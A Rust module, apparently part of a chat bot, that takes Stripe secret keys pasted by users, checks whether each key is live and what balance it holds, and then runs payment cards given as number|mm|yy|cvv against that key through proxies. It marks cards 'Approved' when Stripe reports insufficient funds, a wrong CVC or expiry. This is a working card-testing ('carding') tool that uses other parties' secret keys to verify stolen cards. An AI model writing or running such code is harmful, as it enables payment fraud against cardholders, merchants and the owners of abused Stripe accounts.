use crate::config::get_config;
use crate::database::kvs::{self, get_json, set_json};
use chrono::Utc;
use regex::Regex;
use reqwest;
use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UserSkSession {
    pub sk: String,
    pub proxy: Option<String>,
    pub validated_at: String,
    pub balance: f64,
    pub currency: String,
    pub account_id: Option<String>,
    pub live: bool,
}

#[derive(Debug, Clone)]
pub struct SkValidationResult {
    pub live: bool,
    pub balance: f64,
    pub currency: String,
    pub account_id: Option<String>,
    pub message: String,
}

#[derive(Debug, Clone)]
pub struct CcSkCheckResult {
    pub approved: bool,
    pub status: String,
    pub response: String,
}

pub fn session_key(user_id: i64) -> String {
    format!("kissshot:sk_session:{}", user_id)
}

pub fn extract_sk(text: &str) -> Option<String> {
    Regex::new(r"sk_(live|test)_\S+")
        .ok()?
        .find(text)
        .map(|m| m.as_str().to_string())
}

pub fn extract_proxy(text: &str) -> Option<String> {
    Regex::new(r"(?i)\b(?:https?|socks4|socks5)://\S+")
        .ok()?
        .find(text)
        .map(|m| m.as_str().to_string())
}

pub fn mask_sk(sk: &str) -> String {
    if sk.len() > 20 {
        format!("{}...{}", &sk[..12], &sk[sk.len() - 4..])
    } else {
        sk.to_string()
    }
}

pub fn create_client(proxy_url: Option<&str>) -> Result<reqwest::Client, String> {
    let effective_proxy = if let Some(url) = proxy_url {
        Some(url.to_string())
    } else {
        get_config()
            .ok()
            .and_then(|cfg| cfg.config.proxy.proxy.clone())
            .filter(|p| !p.trim().is_empty())
    };

    let mut builder = reqwest::Client::builder().timeout(std::time::Duration::from_secs(20));

    if let Some(url) = effective_proxy {
        let proxy = reqwest::Proxy::all(&url).map_err(|e| format!("Invalid proxy: {}", e))?;
        builder = builder.proxy(proxy);
    }

    builder
        .build()
        .map_err(|e| format!("Failed to build HTTP client: {}", e))
}

pub async fn load_session(user_id: i64) -> Result<Option<UserSkSession>, String> {
    get_json::<UserSkSession>(&session_key(user_id))
        .await
        .map_err(|e| format!("Failed to load session: {}", e))
}

pub async fn save_session(user_id: i64, session: &UserSkSession) -> Result<(), String> {
    set_json(&session_key(user_id), session, None)
        .await
        .map_err(|e| format!("Failed to save session: {}", e))?;
    Ok(())
}

pub async fn clear_session(user_id: i64) -> Result<(), String> {
    kvs::delete(&session_key(user_id))
        .await
        .map_err(|e| format!("Failed to clear session: {}", e))?;
    Ok(())
}

pub async fn validate_sk(sk: &str, proxy_url: Option<&str>) -> SkValidationResult {
    let client = match create_client(proxy_url) {
        Ok(c) => c,
        Err(e) => {
            return SkValidationResult {
                live: false,
                balance: 0.0,
                currency: String::new(),
                account_id: None,
                message: e,
            };
        }
    };

    let balance_resp = match client
        .get("https://api.stripe.com/v1/balance")
        .header("Authorization", format!("Bearer {}", sk))
        .send()
        .await
    {
        Ok(resp) => resp,
        Err(e) => {
            return SkValidationResult {
                live: false,
                balance: 0.0,
                currency: String::new(),
                account_id: None,
                message: format!("Request failed: {}", e),
            };
        }
    };

    let status = balance_resp.status();
    let body = balance_resp.text().await.unwrap_or_default();

    if !status.is_success() {
        let message = serde_json::from_str::<Value>(&body)
            .ok()
            .and_then(|v| {
                v.get("error")
                    .and_then(|e| e.get("message"))
                    .and_then(|m| m.as_str())
                    .map(|s| s.to_string())
            })
            .unwrap_or_else(|| "Invalid or dead SK".to_string());

        return SkValidationResult {
            live: false,
            balance: 0.0,
            currency: String::new(),
            account_id: None,
            message,
        };
    }

    let balance_data: Value = match serde_json::from_str(&body) {
        Ok(v) => v,
        Err(_) => {
            return SkValidationResult {
                live: false,
                balance: 0.0,
                currency: String::new(),
                account_id: None,
                message: "Invalid balance response".to_string(),
            };
        }
    };

    let balance = balance_data
        .get("available")
        .and_then(|a| a.get(0))
        .and_then(|b| b.get("amount"))
        .and_then(|a| a.as_u64())
        .unwrap_or(0) as f64
        / 100.0;

    let currency = balance_data
        .get("available")
        .and_then(|a| a.get(0))
        .and_then(|b| b.get("currency"))
        .and_then(|c| c.as_str())
        .unwrap_or("usd")
        .to_uppercase();

    let account_id = client
        .get("https://api.stripe.com/v1/account")
        .header("Authorization", format!("Bearer {}", sk))
        .send()
        .await
        .ok()
        .and_then(|r| r.json::<Value>().ok())
        .and_then(|v| v.get("id").and_then(|id| id.as_str()).map(String::from));

    SkValidationResult {
        live: true,
        balance,
        currency,
        account_id,
        message: "SK validated successfully".to_string(),
    }
}

pub async fn check_cc_with_sk(
    sk: &str,
    proxy_url: Option<&str>,
    cc: &str,
) -> Result<CcSkCheckResult, String> {
    let parts: Vec<&str> = cc.split('|').collect();
    if parts.len() < 4 {
        return Err("Invalid CC format. Use: number|mm|yy|cvv".to_string());
    }

    let client = create_client(proxy_url)?;

    let pm_resp = client
        .post("https://api.stripe.com/v1/payment_methods")
        .header("Authorization", format!("Bearer {}", sk))
        .form(&[
            ("type", "card"),
            ("card[number]", parts[0]),
            ("card[exp_month]", parts[1]),
            ("card[exp_year]", parts[2]),
            ("card[cvc]", parts[3]),
        ])
        .send()
        .await
        .map_err(|e| format!("Stripe request failed: {}", e))?;

    let body = pm_resp.text().await.unwrap_or_default();
    let data: Value = serde_json::from_str(&body).unwrap_or(Value::Null);

    if data.get("id").and_then(|id| id.as_str()).is_some() {
        return Ok(CcSkCheckResult {
            approved: true,
            status: "Approved ✅".to_string(),
            response: "Payment method created — card valid on this SK".to_string(),
        });
    }

    let error_msg = data
        .get("error")
        .and_then(|e| e.get("message"))
        .and_then(|m| m.as_str())
        .unwrap_or("Unknown decline")
        .to_string();

    let error_type = data
        .get("error")
        .and_then(|e| e.get("code"))
        .and_then(|c| c.as_str())
        .unwrap_or("");

    let approved = error_msg.contains("insufficient funds")
        || error_msg.contains("security code is incorrect")
        || error_msg.contains("incorrect_cvc")
        || error_type == "incorrect_cvc"
        || error_msg.contains("expired card");

    Ok(CcSkCheckResult {
        approved,
        status: if approved {
            "Approved ✅".to_string()
        } else {
            "Declined ❌".to_string()
        },
        response: error_msg,
    })
}

pub fn build_session_from_validation(
    sk: String,
    proxy: Option<String>,
    validation: &SkValidationResult,
) -> UserSkSession {
    UserSkSession {
        sk,
        proxy,
        validated_at: Utc::now().format("%Y-%m-%d %H:%M:%S UTC").to_string(),
        balance: validation.balance,
        currency: validation.currency.clone(),
        account_id: validation.account_id.clone(),
        live: validation.live,
    }
}
